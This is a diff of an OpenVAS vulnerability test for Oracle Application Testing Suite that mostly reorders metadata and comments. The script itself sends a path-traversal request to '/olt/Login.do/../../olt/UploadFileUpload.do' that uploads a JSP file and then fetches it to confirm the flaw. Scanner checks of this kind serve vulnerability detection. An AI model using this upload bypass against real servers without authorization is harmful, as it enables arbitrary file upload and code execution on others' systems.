@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_owat_suite_multiple_vuln.nasl 11026 2018-08-17 08:52:26Z cfischer $
+# $Id: gb_owat_suite_multiple_vuln.nasl 11197 2018-09-03 13:31:53Z cfischer $
 #
 # Oracle Application Testing Suite Multiple Vulnerabilities
 #
@@ -29,7 +29,7 @@ CPE = "cpe:/a:oracle:application_testing_suite";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.809731");
-  script_version("$Revision: 11026 $");
+  script_version("$Revision: 11197 $");
   script_cve_id("CVE-2016-0491", "CVE-2016-0492", "CVE-2016-0489", "CVE-2016-0488",
                 "CVE-2016-0487", "CVE-2016-0490", "CVE-2016-0476", "CVE-2016-0477",
                 "CVE-2016-0478", "CVE-2016-0480", "CVE-2016-0481", "CVE-2016-0482",
@@ -38,10 +38,18 @@ if(description)
                     81184, 81169, 81199, 81105, 81173, 81163);
   script_tag(name:"cvss_base", value:"6.5");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");
-  script_tag(name:"last_modification", value:"$Date: 2018-08-17 10:52:26 +0200 (Fri, 17 Aug 2018) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-09-03 15:31:53 +0200 (Mon, 03 Sep 2018) $");
   script_tag(name:"creation_date", value:"2016-11-25 12:07:57 +0530 (Fri, 25 Nov 2016)");
-  script_tag(name:"qod_type", value:"exploit");
   script_name("Oracle Application Testing Suite Multiple Vulnerabilities");
+  script_category(ACT_ATTACK);
+  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
+  script_family("Web application abuses");
+  script_dependencies("gb_oracle_web_app_test_suite_detect.nasl");
+  script_mandatory_keys("Oracle/Application/Testing/Suite/installed");
+  script_require_ports("Services/www", 8088);
+
+  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39691");
+  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html");
 
   script_tag(name:"summary", value:"This host is installed with Oracle Application
   Testing Suite and is prone to multiple vulnerabilities.");
@@ -103,16 +111,8 @@ if(description)
   script_tag(name:"solution", value:"Apply update from the link mentioned below
   http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html");
 
+  script_tag(name:"qod_type", value:"exploit");
   script_tag(name:"solution_type", value:"VendorFix");
-
-  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/39691");
-  script_xref(name:"URL", value:"http://www.oracle.com/technetwork/topics/security/cpujan2016-2367955.html");
-  script_category(ACT_ATTACK);
-  script_copyright("Copyright (C) 2016 Greenbone Networks GmbH");
-  script_family("Web application abuses");
-  script_dependencies("gb_oracle_web_app_test_suite_detect.nasl");
-  script_mandatory_keys("Oracle/Application/Testing/Suite/installed");
-  script_require_ports("Services/www", 8088);
 
   exit(0);
 }
@@ -126,10 +126,8 @@ if(!oatPort = get_app_port(cpe:CPE)){
   exit(0);
 }
 
-##Upload file name
 uploadfile = "OpenVASTEST.jsp";
 
-##Create POST Data
 postData = string('-----------------------------OpenVAS\r\n',
                   'Content-Disposition: form-data; name="storage.extension"\r\n\r\n',
                   '.jsp\r\n',
@@ -164,22 +162,20 @@ vuln_url = "/olt/Login.do/../../olt/UploadFileUpload.do";
 req = http_post_req( port:oatPort, url:vuln_url,
                      data:postData, add_headers: make_array( "Content-Type",
                      "multipart/form-data; boundary=---------------------------OpenVAS"));
-
-##Send and Receive Response
 res = http_keepalive_send_recv(port: oatPort, data: req);
 
-if(res =~ "HTTP/1.. 200 OK" && "Upload failed" >!< res)
-{
-  ##Send request to uploaded file
+if(res =~ "HTTP/1.. 200 OK" && "Upload failed" >!< res){
+
   url = "/olt/pages/" + uploadfile;
   req = http_get(item: url, port:oatPort);
   res = http_keepalive_send_recv(port: oatPort, data: req);
 
-  if(res && "OpenVAS-File-Upload-Test" >< res)
-  {
+  if(res && "OpenVAS-File-Upload-Test" >< res){
     report = report_vuln_url( port:oatPort, url:vuln_url);
     report = report + '\n' + "OpenVAS has uploaded a file: " + uploadfile + ". Please remove it manually.";
     security_message(port:oatPort, data:report);
     exit(0);
   }
 }
+
+exit(99);
